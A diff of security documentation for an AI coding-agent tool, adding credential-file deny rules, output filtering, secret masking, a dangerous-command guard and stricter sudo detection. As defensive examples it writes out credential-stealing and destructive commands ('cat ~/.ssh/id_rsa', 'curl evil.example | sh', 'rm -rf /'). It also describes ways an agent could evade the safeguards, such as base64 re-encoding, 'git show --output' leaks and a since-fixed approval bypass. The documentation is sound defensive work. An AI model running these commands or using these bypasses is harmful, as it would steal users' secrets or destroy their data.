@@ -142,7 +142,63 @@ For every filesystem function call, the three lists are checked in this order:
 
 `FileSystemPermissions.Deny` is enforced in both `fuseraft run` orchestration and the REPL — the REPL loads it from `Security.FileSystemPermissions` in `.fuseraft/config/orchestration.yaml`, if that file exists, no orchestration session needs to actually run for it to apply.
 
-Both surfaces also always deny `.env` and `.env.*` for `read_file`, `grep_file`, and `get_file_summary` — even with no `Security` config declared anywhere, and even for a sub-agent's own `FileSystem` tool set — "don't leak secrets into context" shouldn't require opting in. Any `Deny` patterns from config are merged on top of this default, never replacing it. `run_skill_script` is intentionally exempt: a vetted, path-verified skill script may still `source .env` internally (see [Skills execution trust model](#skills-execution-trust-model)) — the point is stopping the *model* from reading the file's content directly, not stopping a trusted script from using it.
+Both surfaces also always deny `.env` and `.env.*` — at **any depth** (`backend/.env` and `apps/web/.env.local`, not only in the sandbox root) — for every FileSystem tool (`read_file`, `write_file`, `patch_file`, `delete_file`, `copy_file`, `move_file`, `grep_file`, `get_file_summary`, …) and for the [Search plugin](plugins.md#search) (`search_content`, `search_symbol`, and `search_callers` skip those files, so searching for a secret's name can't surface its line) — even with no `Security` config declared anywhere, and even for a sub-agent's own `FileSystem` tool set — "don't leak secrets into context" shouldn't require opting in. Any `Deny` patterns from config are merged on top of this default, never replacing it. `run_skill_script` is intentionally exempt: a vetted, path-verified skill script may still `source .env` internally (see [Skills execution trust model](#skills-execution-trust-model)) — the point is stopping the *model* from reading the file's content directly, not stopping a trusted script from using it.
+
+### Credential files
+
+On top of `.env`, these files — which exist to hold credentials — are denied by the same mechanism, at any depth, with no configuration:
+
+| Glob | What it protects |
+|------|------------------|
+| `**/id_rsa`, `**/id_dsa`, `**/id_ecdsa`, `**/id_ed25519` | SSH **private** keys (`id_rsa.pub` and the other public keys are *not* matched) |
+| `**/.aws/credentials` | AWS access keys |
+| `**/.netrc`, `**/_netrc` | Stored logins for `curl`, `git`, and friends |
+| `**/.pgpass` | PostgreSQL passwords |
+| `**/.git-credentials` | Plaintext git tokens |
+
+The list is deliberately narrow. Files that merely *might* contain a token — `.npmrc`, `.docker/config.json`, `*.pem` certificates — are left alone, because blocking them breaks ordinary work.
+
+The Shell plugin applies the same protection to commands: one that names a credentials file (`cat ~/.ssh/id_rsa`, `base64 ~/.aws/credentials`, `cp ~/.netrc /tmp`, `cat ~/.ssh/id_*`) is denied with rule `credential-file`, before any approval prompt. The exception is `ssh`, `ssh-add`, and `git`, which take a key path only to authenticate with it: `ssh -i ~/.ssh/id_rsa host` and `git -c core.sshCommand='ssh -i …' fetch` still work. The denial tells the agent to let the tool read the file itself, or to ask you to run the command.
+
+To turn the credential-file protection off — say the agent's actual job is managing SSH keys — set `DenyCredentialFiles: false`. `.env` stays denied either way.
+
+```yaml
+Security:
+  DenyCredentialFiles: false
+```
+
+### A deny rule is never a prompt
+
+Leaving the sandbox is a boundary a human can choose to widen (the REPL offers a y/N prompt to grant a directory for the session). A **deny rule is not a boundary**: it is an explicit "never", and no prompt is ever offered for it — the agent simply gets `[DENIED] … matches a FileSystem deny rule`. The same holds for a protected file *outside* the sandbox, and for a protected file inside a directory you have already granted. Approving one prompt cannot read, overwrite, copy, move, or delete a `.env` or a credentials file.
+
+!!! note "Fixed in this version"
+    Earlier versions routed a deny-rule denial through the sandbox-escape prompt, worded "… is outside the current sandbox — grants '<dir>'". In the default REPL (HITL on), answering `y` read, overwrote, or deleted the protected file. If you relied on `.env` protection with HITL on, this was reachable with a single approval.
+
+### Git output
+
+A diff is file content wearing a different hat, so the [Git plugin](plugins.md#git) applies the same deny rules to what it prints. Where a protected file's diff would appear — `git_diff`, `git_show`, or a patch requested through `git_log` — its body (index line, hunks, binary payload) is replaced by one line:
+
+```
+diff --git a/backend/.env b/backend/.env
+[content hidden: 'backend/.env' matches a FileSystem deny rule]
+```
+
+The header stays, so the agent can see that the file changed, and every other file in the same diff is shown as usual. In `git log -p` output the next commit's header is never swallowed with the file above it. `git_show <ref>:<path>` of a protected path is denied outright, and so is `git_show` of a bare blob hash, since a hash carries no path to check — `git show HEAD:<path>` is the supported way to show a file. Paths are resolved against the repository top-level (`HEAD:./x` against the working directory), quoted non-ASCII paths and paths with spaces are handled, and an ambiguous header is read every plausible way, so the failure mode is hiding an ordinary file, never showing a protected one. `git_status` lists protected files by *name*, which is not content, and is unchanged.
+
+The ref arguments of `git_show` and `git_log` accept display options from an allowlist only. Without that, `git_show` with `HEAD --output=leak.txt` made git write the *unfiltered* patch to a file — deny-ruled files included, at any path the agent named — which `read_file` could then open. Such an option is refused with `[DENIED] git option '--output=…' is not accepted here`.
+
+### Shell, Probe, and every other tool
+
+The rules above would be easy to walk around if the file tools were the only ones that honoured them. The other tools that can hand file content to the model do:
+
+- **Shell and Probe output** goes through the same patch filter as Git: a `git diff`, `git log -p`, or `git show` run through `shell_run`, `shell_run_script`, `shell_run_background`, or `probe_*` has a protected file's body replaced by the `[content hidden: …]` line. `shell_run "git diff"` names no protected file, so the [shell guard](#credential-files) has nothing to object to; the output filter is what stops it. The repository is found by walking up from the directory the command ran in, so `git -C <other-repo> diff` is filtered against the wrong top-level and can miss a pattern anchored to the sandbox root (`**/.env`-style patterns match at any depth and are unaffected). A `cat` of a saved patch file is filtered too.
+- **Values inside protected files are masked** wherever a command prints them — see [Secret values in tool output](#secret-values-in-tool-output). `cat .e*`, `grep -r API_KEY .`, and a Python one-liner that opens the file itself no longer print it, although none of them name `.env`.
+- **`Document`** (`document_extract_text`, `document_get_info`, `document_list_sheets`, `document_get_sheet`) applies the deny rules before opening a file, so a deny-ruled `.xlsx` or `.pdf` is not readable through it either.
+- **`Probe`** runs every command it starts through the shell guard: the [dangerous-command](#dangerous-command-guard) and `sudo` rules, `ShellPolicy`, the HITL prompt, and the sandbox working directory. Before this, `probe_code` was an alternative shell with none of those. For a non-shell language (`python`, `javascript`, …) only the credential-file rule, `ShellPolicy`, and approval apply — the snippet isn't shell syntax, so the `sudo` and fetch-to-exec parsers don't run on it.
+- **`Http`** follows redirects itself. Every hop is checked against `HttpAllowedHosts` and the private-address rules, exactly like the first request, so an allowlisted host can no longer bounce a request to a host that isn't. Credentials stay on their origin: once a redirect leaves the origin, every header except `Accept`, `Accept-Language`, `Accept-Encoding`, `Cache-Control`, and `Pragma` is dropped for the rest of the chain — .NET alone strips only `Authorization`, so an API profile's `X-Api-Key` used to follow a cross-host redirect. An `https` → `http` redirect is refused, and a chain is cut off after 10 hops. A refused hop returns `[DENIED] The server redirected to '<url>', which is not permitted: <reason>`.
+
+!!! warning "What the output filter and the masker cannot do"
+    Both work on text after the fact. They stop a command that prints a protected file *by accident or by an unnamed path*; they do not stop a model that deliberately re-encodes a value (`base64`, `rev`, splitting it across lines), and the file tools (`read_file`, `search_*`) are not masked — rewriting a file from text with `<secret-hidden>` substituted into it would corrupt the file, so those tools rely on the deny rules alone. If a tracked secret matters to you, keep it out of the repository (`.gitignore` it), or run in `/hitl on` and read the commands you approve.
 
 ---
 
@@ -167,12 +223,46 @@ Security:
 ### Evaluation
 
 - **Deny is checked first.** If the command text contains any `Deny` pattern (case-insensitive substring match), the command is blocked regardless of the `Allow` list.
-- **Allow is evaluated next.** When the `Allow` list is non-empty, the command must contain at least one `Allow` pattern (case-insensitive substring match) to proceed. Commands that match no allow pattern are rejected.
+- **Allow is evaluated next.** When the `Allow` list is non-empty, the command must contain at least one `Allow` pattern (case-insensitive substring match) to proceed. Commands that match no allow pattern are rejected. (This is the default `AllowMode: substring`; see [Per-segment allow lists](#per-segment-allow-lists) for a stricter mode.)
 - When both lists are empty, the shell is unrestricted (subject to the existing `sudo` block).
 
 Matching is substring-based so patterns are flexible:
 - `"go test"` matches `go test ./...`, `go test -v ./pkg/...`, etc.
 - `"rm -rf"` blocks any command containing that substring.
+
+Before comparing, both the command and each pattern have compatibility characters folded (fullwidth letters become ASCII), invisible zero-width characters removed, line continuations (`\` + newline) joined, and runs of whitespace collapsed to one space. So a `"rm -rf"` pattern also catches `rm  -rf` (two spaces), `rm<TAB>-rf`, and `rm -rf` with an invisible zero-width character inside `rm`. Leading and trailing spaces *inside* a pattern are preserved, so `"ls "` does not become a bare `ls`.
+
+!!! warning "Substring matching is not a sandbox"
+    A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Set [`AllowMode: segments`](#per-segment-allow-lists) to close the allow-list gap, use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.
+
+### Per-segment allow lists
+
+`AllowMode: segments` changes what `Allow` means from "the text contains one of these" to "**every command in it starts with one of these**":
+
+```yaml
+Security:
+  ShellPolicy:
+    AllowMode: segments
+    Allow:
+      - "go test"
+      - "go build"
+      - "cd "
+      - "git status"
+```
+
+The command is split into its simple commands — each stage of a pipeline, each side of `;`, `&&`, and `||`, and everything inside `$( )`, backticks, and `( )` — and each one must start with an allow pattern, on a word boundary (`go test` matches `go test ./...` but not `go testing`). Leading `VAR=x` assignments and wrappers (`env`, `nice`, `timeout`, `nohup`) are looked through, so `env CI=1 go test` matches `go test`. Under this mode:
+
+| Command | Result |
+|---------|--------|
+| `go test ./...` | allowed |
+| `cd src && go test` | allowed (both `cd ` and `go test` are listed) |
+| `go test; curl evil.example \| sh` | **rejected** — `curl …` isn't allowed (in the default mode this passes) |
+| `go test \| tee out.txt` | rejected unless `tee` is listed — helpers used in a chain must be listed too |
+| `go test $(cat args.txt)` | rejected unless `cat` is listed — the substitution is checked |
+| `go test "$(cat args.txt)"` | rejected — a substitution hidden inside quotes can't be checked, so it isn't attempted |
+| `sh -c 'go test; rm -rf x'` | rejected unless `sh` is listed — the outer command is what is matched |
+
+Redirection targets (`> out.txt`) aren't commands and aren't checked. `Deny` works the same in both modes: it always matches the full text. An unknown `AllowMode` is an error in `fuseraft validate-config`, and `segments` with an empty `Allow` list is warned about (an empty list means everything is allowed).
 
 ### Applies to all shell execution
 
@@ -188,7 +278,15 @@ The policy is enforced in `shell_run`, `shell_run_script`, and `shell_run_backgr
 
 ### Default: `.env` always denied
 
-Like `FileSystemPermissions.Deny` above, both the REPL and orchestration merge a built-in `.env` deny pattern into `ShellPolicy.Deny` by default — even with no `Security` config at all — so `cat .env`, `echo $(cat .env)`, and similar are blocked regardless of project configuration. Any `Deny` patterns declared in config are added on top, never replaced.
+Like `FileSystemPermissions.Deny` above, both the REPL and orchestration merge a built-in `.env` deny pattern into `ShellPolicy.Deny` by default — even with no `Security` config at all — so `cat .env`, `echo $(cat .env)`, and similar are blocked regardless of project configuration. Any `Deny` patterns declared in config are added on top, never replaced. Commands that name a [credentials file](#credential-files) (an SSH private key, `~/.aws/credentials`, …) are blocked the same way, by the `credential-file` rule of the [dangerous-command guard](#dangerous-command-guard).
+
+---
+
+## Sub-agents obey the session's restrictions
+
+The REPL's sub-agents — the built-in `/explore`, `/locate`, `/delegate` and any [user-defined agent](sub-agents.md) — are built from the same sandboxed, deny-ruled, HITL-gated tool instances as the main agent, and every run is also filtered through the session's live tool gate. `/safe-mode on` and `/tools restrict` therefore reach delegated work: an agent cannot run a shell command or make a commit the session has closed off. The gate is read at run time, so toggling safe mode takes effect on the next run.
+
+A user-defined agent's *default* tool set is strictly read-only — it excludes `shell_run` even though the built-in explorer includes it — and an agent never receives the sub-agent tools, so agents cannot spawn agents.
 
 ---
 
@@ -351,9 +449,43 @@ See [Governance — Execution rings](governance.md#execution-rings) for details.
 
 ---
 
+## Dangerous-command guard
+
+Beyond `sudo`, the Shell plugin unconditionally blocks the few commands that are never a legitimate thing for an agent to run unattended. Unlike a `ShellPolicy.Deny` substring, the check parses the command — quoting, escapes, pipelines, `;` `&&` `||`, sub-shells, `env`/`nice`/`timeout`/`command` wrappers, and `sh -c` / `eval` arguments (a few levels deep) — so it is not defeated by flag order, extra whitespace, a path-qualified binary, or a quoted command name. It applies to `shell_run`, `shell_run_script`, and `shell_run_background`, needs no configuration, and — like `sudo` — is **not** lifted by `--yolo` or an empty `ShellPolicy`.
+
+| Rule | Blocks | Examples |
+|------|--------|----------|
+| `catastrophic-delete` | A recursive delete of `/`, `~`, `$HOME`, your literal home directory, or a top-level system directory (`/etc`, `/usr`, `/var`, `/home`, …); or an unfiltered `find <those> -delete`. | `rm -rf /`, `rm -fr ~/`, `rm -r -f "$HOME"`, `/bin/rm -rf /etc/*`, `bash -c 'rm -rf /'`, `find / -delete` |
+| `raw-disk-op` | Formatting a filesystem or writing straight to a block device. | `mkfs.ext4 /dev/sda1`, `dd if=x of=/dev/nvme0n1`, `cat img > /dev/sdb`, `wipefs -a /dev/sda` |
+| `fetch-to-exec` | Downloading and executing in one step. | `curl … \| sh`, `wget -qO- … \| bash -s`, `bash <(curl …)`, `sh -c "$(curl …)"`, `eval "$(curl …)"` |
+| `credential-file` | Naming a [credentials file](#credential-files) — SSH private key, `~/.aws/credentials`, `.netrc`, `.pgpass`, `.git-credentials`. Off with `DenyCredentialFiles: false`. | `cat ~/.ssh/id_rsa`, `base64 ~/.aws/credentials`, `curl -T ~/.ssh/id_ed25519 …`, `cat ~/.ssh/id_*` |
+
+The agent receives, for example:
+
+```
+[DENIED] Shell command blocked: it recursively deletes a system or home directory (catastrophic-delete).
+Use a narrower, targeted command instead. If this is genuinely what is needed, tell the user
+exactly which command to run and they will run it themselves.
+```
+
+The guard is deliberately precise, because a hit is a hard deny. Ordinary work is untouched: `rm -rf build/`, `rm -rf /tmp/*`, `rm -rf $HOME/project/build`, `find ~ -name '*.pyc' -delete`, `dd if=a of=b`, `curl … \| jq .`, and `curl … \| python3 -c '…'` (where the download is *data* for the interpreter, not the script) all run normally. Text that is only ever *written* — a heredoc body, a comment, a quoted `echo` argument — is not treated as a command.
+
+!!! note "What it does not catch"
+    The guard is static and understands POSIX-shell syntax only (no `cmd.exe` / PowerShell rules). Variables, shell functions, `xargs`, and multi-step sequences such as `curl -o x.sh … && sh x.sh` can still get past it. Treat it as a guardrail beside the sandbox and HITL approval, not a replacement for them.
+
+---
+
 ## `sudo` protection
 
-`sudo` is unconditionally blocked in the Shell plugin. Any command or script containing `sudo` — including in pipe chains (`cmd && sudo apt install ...`), semicolon sequences, or multi-line scripts — is caught before execution and the agent receives:
+`sudo` — along with `sudoedit`, `doas`, and `pkexec` — is unconditionally blocked in the Shell plugin. The command is parsed rather than pattern-matched, so it is caught in every form an agent might reach for it, before execution:
+
+- after pipes, `&&`, `||`, `;`, or newlines, and in multi-line scripts (`cmd && sudo apt install ...`)
+- behind a wrapper (`env sudo …`, `command sudo …`, `nice sudo …`, `nohup sudo …`, `timeout 10 sudo …`)
+- by path, quoted, or backslashed (`/usr/bin/sudo …`, `'sudo' …`, `\sudo …`), and with fullwidth look-alike letters
+- inside `(sudo …)`, `$(sudo …)`, backticks, `if … then sudo …`, `bash -c 'sudo …'`, or `eval "sudo …"`
+- as the command that `xargs` or `find -exec` runs (`… | xargs sudo tee`, `find . -exec sudo rm {} \;`)
+
+Merely *mentioning* the word is fine — `grep sudo /etc/group`, `man sudo`, `git commit -m "add sudo support"`, `find / -name sudo`, and `xargs grep sudo` all run — and so is `ssh host sudo …`, which escalates on the remote machine, not this one. A line-start `sudo` inside a heredoc or script body is still blocked, as it always was. The agent receives (with `doas` / `pkexec` / `sudoedit` named instead when that is what was used):
 
 ```
 [DENIED] sudo is not permitted. Prefer non-privileged alternatives: pip install --user,
@@ -399,6 +531,21 @@ All log output (console, `~/.fuseraft/logs/app.log`, and any debug sidecar file)
 | `(?i)(api_key\|token\|secret)=<value>` | `api_key=supersecret` | `[REDACTED]` |
 
 This means even if a provider error response or debug trace contains an API key, it is stripped before reaching any log sink. No configuration is required — masking is always active.
+
+### Secret values in tool output
+
+Shell children inherit fuseraft's environment, so `env`, `printenv`, `echo $GITHUB_TOKEN`, or a verbose CLI would otherwise hand a live credential to the model — and from there to the provider request and the saved session log. To prevent that, the values of **secret-looking environment variables** are replaced with `<secret-hidden>` in everything the Shell, Git, and Probe plugins return (`shell_run`, `shell_run_script`, `shell_get_job_status`, `shell_get_job_output`, every `git_*` result, and every `probe_*` result) and in `http_*` response bodies, and `shell_get_env` returns `<secret-hidden>` for such a variable instead of its value.
+
+A variable counts as secret-looking when its name ends in, or contains as an `_`-delimited word, one of `KEY`, `API_KEY`, `ACCESS_KEY`, `SECRET_KEY`, `PRIVATE_KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `PASSWD`, `PASSPHRASE`, `CREDENTIAL(S)`, or `CONNECTION_STRING` (plus `MYSQL_PWD`) — so `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and `PGPASSWORD` match, while `PATH`, `SSH_AUTH_SOCK`, and `KEYBOARD_LAYOUT` do not. Names that point *to* a secret rather than hold one (`AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN_FILE`, `TOKEN_URL`, `SSH_KEY_PATH`) are left alone. Values shorter than 8 characters are not masked in output, to avoid mangling ordinary words such as `true`.
+
+The agent never needs the value itself: a command can reference `$NAME` and the shell expands it. The environment is re-read on every call, so a variable added with `shell_set_env` mid-session is covered too.
+
+**Secrets inside protected files are masked too.** The [FileSystem deny rules](#filesystem-permissions-read-write-deny-globs) stop the file tools from reading `.env`, but `cat .e*` or `grep -r API_KEY .` doesn't name it. So the values in every file a deny rule matches under the sandbox root (and the well-known credential files in your home directory, unless `DenyCredentialFiles: false`) are masked the same way. What counts as a secret there: the value of a secret-named `KEY=VALUE` / `KEY: VALUE` line (the same name test as above, plus `PASS`, `PWD`, `DSN`, `BEARER`, `SALT`); a password inside a URL (`postgres://user:PASSWORD@host`, every `.git-credentials` line); the body of a PEM private key; a `.netrc` `password`; and the last field of a `.pgpass` line. `PORT=3000` and `NODE_ENV=production` are not secrets and stay readable.
+
+The scan skips dependency directories (`node_modules`, `bin`, `obj`, `.git`, `vendor`, …) and symlinked directories, looks at most 8 levels deep and 20,000 entries, reads files up to 256 KB, and is cached for 10 seconds — a `.env` created mid-session is picked up within that window. With no deny rules configured, nothing is scanned.
+
+!!! note "Limitations"
+    This is exact-value masking. It stops accidental exposure, not a model that deliberately re-encodes a secret (`echo $KEY | base64`). It only knows about variables in the process environment and the files above, and it applies to tool output — not to the `!<command>` REPL escape, which is yours, not the agent's. For the adversarial case use the filesystem sandbox and HITL approval.
 
 | Platform | Store | Mechanism |
 |----------|-------|-----------|
